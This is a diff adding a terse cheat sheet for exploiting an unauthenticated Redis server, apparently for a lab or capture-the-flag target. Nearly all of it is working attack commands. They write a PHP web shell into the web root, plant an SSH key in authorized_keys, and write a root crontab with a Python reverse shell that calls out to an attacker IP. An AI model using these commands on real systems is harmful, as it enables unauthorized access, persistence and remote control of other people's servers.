@@ -1,0 +1,55 @@
+redis-cli -h 10.10.10.160 -p 6379 echo "Authentication not required"
+
+redis-cli -h 10.10.10.160 -p 6379 info
+
+redis-cli -h 10.10.10.160 -p 6379 config get dir
+
+================
+= Get-Webshell =
+================
+
+redis-cli -h 10.85.0.52 -p 6379
+
+config set dir /usr/share/nginx/html # or whatever web root dir like /var/www/html
+
+config set dbfilename redis.php #here redis.php is the file into which we want to write
+
+set test "<?php phpinfo(); ?>"
+
+save
+
+====================
+= Get SSH-Crackit  =
+====================
+
+#Generate ssh-key
+ssh-keygen -t rsa
+
+# Add 2 empty lines before and after the pub file
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
+
+# set the crack-it
+cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
+
+redis-cli -h 10.10.10.160
+
+#get redis home dir with redis-cli -h 10.10.10.160 -p 6379 config get dir
+config set dir /home/test/.ssh/ #or /var/lib/redis/.ssh/ 
+
+config set dbfilename "authorized_keys"
+
+save
+
+ssh -i /tmp/id_rsa redis@10.10.10.160
+
+==============================
+= Get Reverse Shell-Crontab  =
+==============================
+
+echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.107\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.10.10.160 -x set 1
+
+redis-cli -h 10.10.10.160 config set dir /var/spool/cron/crontabs/
+
+redis-cli -h 10.10.10.160 config set dbfilename root
+
+redis-cli -h 10.10.10.160 save
